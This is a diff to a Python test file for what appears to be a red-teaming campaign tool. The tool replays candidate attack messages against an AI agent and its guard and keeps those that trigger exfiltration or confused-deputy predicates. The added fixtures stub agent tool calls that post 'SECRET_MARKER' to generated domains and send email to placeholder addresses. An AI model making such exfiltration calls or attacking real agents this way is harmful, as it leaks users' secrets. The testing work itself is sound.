@@ -1,5 +1,6 @@
 """Tests for the pre-submission firing gate (campaign.verify)."""
 
+import hashlib
 from collections.abc import Callable, Sequence
 from pathlib import Path
 
@@ -33,6 +34,24 @@ def _fake_tokenizers() -> tuple[_FakeTokenizer, _FakeTokenizer]:
     return (_FakeTokenizer(), _FakeTokenizer())
 
 
+def _post_event(msg: str) -> dict:
+    """A firing http.post event to a UNIQUE real domain derived from ``msg``.
+
+    Each candidate lands its own novelty cell -- the firing_only max-score gate needs a
+    fresh, non-"unknown" bucket per kept candidate.
+    """
+    dom = "d" + hashlib.md5(msg.encode()).hexdigest()[:8]
+    return {
+        "name": "http.post",
+        "ok": True,
+        "args": {"url": f"http://{dom}.co", "data": "SECRET_MARKER"},
+        "output": "ok",
+        "source": "tool",
+        "side_effect": "",
+        "scope": "",
+    }
+
+
 def _fake_replay(fire_if: Callable[[str], bool]) -> _Replay:
     """A replay_chain stub firing one EXFIL per message where ``fire_if`` is true.
 
@@ -46,7 +65,11 @@ def _fake_replay(fire_if: Callable[[str], bool]) -> _Replay:
         preds = [
             {"predicate": "EXFILTRATION", "severity": 5} for m in messages if fire_if(m)
         ]
-        trace = {"raw_gen_tokens": float(sum(len(m) for m in messages))}
+        events = [_post_event(m) for m in messages if fire_if(m)]
+        trace = {
+            "raw_gen_tokens": float(sum(len(m) for m in messages)),
+            "tool_events": events,
+        }
         return trace, preds, 0.1
 
     return replay
@@ -64,16 +87,31 @@ def test_firing_only_gates_on_the_given_predicate(
 ) -> None:
     """firing_only(predicate=CONFUSED_DEPUTY) keeps deputy-firing candidates only."""
 
+    def _email_event(m: str) -> dict:
+        addr = "a" + hashlib.md5(m.encode()).hexdigest()[:8] + "@x.invalid"
+        return {
+            "name": "email.send",
+            "ok": True,
+            "args": {"to": addr, "subject": "s", "body": "b"},
+            "output": "sent",
+            "source": "tool",
+            "side_effect": "",
+            "scope": "",
+        }
+
     def replay(
         messages: Sequence[str], model: str, guard: object
     ) -> tuple[dict, list, float]:
         preds = []
+        events = []
         for m in messages:
             if "NOTIFY" in m:
                 preds.append({"predicate": "CONFUSED_DEPUTY", "severity": 3})
+                events.append(_email_event(m))  # unique recipient -> unique cell
             elif "EXFIL" in m:
                 preds.append({"predicate": "EXFILTRATION", "severity": 5})
-        return {"raw_gen_tokens": 1.0}, preds, 0.1
+                events.append(_post_event(m))
+        return {"raw_gen_tokens": 1.0, "tool_events": events}, preds, 0.1
 
     monkeypatch.setattr(verify, "replay_chain", replay)
     chains = [["NOTIFY a"], ["EXFIL b"], ["NOTIFY c"]]
@@ -133,7 +171,7 @@ def _replay_with_hops(hops_for: Callable[[str], int]) -> _Replay:
             for m in messages
             if "SECRET_MARKER" in m
         ]
-        events = [{} for m in messages for _ in range(hops_for(m))]
+        events = [_post_event(m) for m in messages for _ in range(hops_for(m))]
         return {"raw_gen_tokens": 10.0, "tool_events": events}, preds, 0.1
 
     return replay
